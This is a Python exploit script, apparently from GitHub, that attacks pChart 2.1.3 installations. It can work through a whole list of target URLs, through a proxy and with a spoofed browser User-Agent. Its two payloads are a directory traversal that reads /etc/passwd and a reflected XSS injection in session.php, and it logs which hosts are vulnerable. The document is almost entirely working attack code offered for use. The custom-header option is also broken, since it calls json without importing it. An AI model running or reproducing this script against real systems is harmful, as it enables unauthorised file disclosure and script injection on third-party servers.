#!/usr/bin/python3
import requests
import argparse

parser=argparse.ArgumentParser(description="pChart2.1.3 Exploit    --By Infiltrator",epilog="GitHub:https://github.com/nhpt")

group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-u',help='目标URL，如:http://www.test.com/pChart2.1.3')
group.add_argument('-f',type=argparse.FileType('r',encoding='utf8'),help='目标URL文件')

parser.add_argument('-p',help='代理地址，如：http://127.0.0.1:8080')
parser.add_argument('-H',help='HTTP Headers，如：{"X-Forwarded-For":"127.0.0.1"}')
parser.add_argument('-t',help='超时时间，单位：秒')
parser.add_argument('-o', type=argparse.FileType('w', encoding='UTF-8'),help='保存扫描结果到文本文件')

args=parser.parse_args()
requests.packages.urllib3.disable_warnings()

timeout=None
proxies=None
head = {
    "User-Agent":"Mozilla/4.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
}

def proxy(proxy):
    try:
        key=proxy.split('://')[0]
        return {key:proxy}
    except:
        exit('[!] 代理地址格式有误！')

def headers(header):
    try:
        headers=json.loads(header)
        return headers
    except:
        exit('[!] HTTP请求头格式有误！')

def directory_traversal(url):
    url=url+'/examples/index.php?Action=View&Script=/../../../../etc/passwd'
    try:
        r=requests.get(url,headers=head,proxies=proxies,timeout=timeout,verify=False)
        if '/bin' in r.text and '/usr' in r.text:
            print("[+] 存在路径穿越漏洞！",url)
            if args.o:
                args.o.write('路径穿越    '+url+'\n')
    except:
        pass

def crossSite_scripting(url):
    url=url+'/examples/sandbox/script/session.php?<sCrIpt>alert("a03f1290f1c4")</ScRiPt>'
    try:
        r=requests.get(url,headers=head,proxies=proxies,timeout=timeout,verify=False)
        if 'alert("a03f1290f1c4")' in r.text:
            print("[+] 存在XSS漏洞！",url)
            if args.o:
                args.o.write('XSS    '+url+'\n')
    except:
        pass

if args.p:
    proxies=proxy(args.p)
if args.H:
    head=headers(args.H)
if args.t:
    timeout=float(args.t)
if args.u:
    urls=[args.u]
else:
    urls=[x.strip('\n') for x in args.f.readlines()]
for u in urls:
    directory_traversal(u)
    crossSite_scripting(u)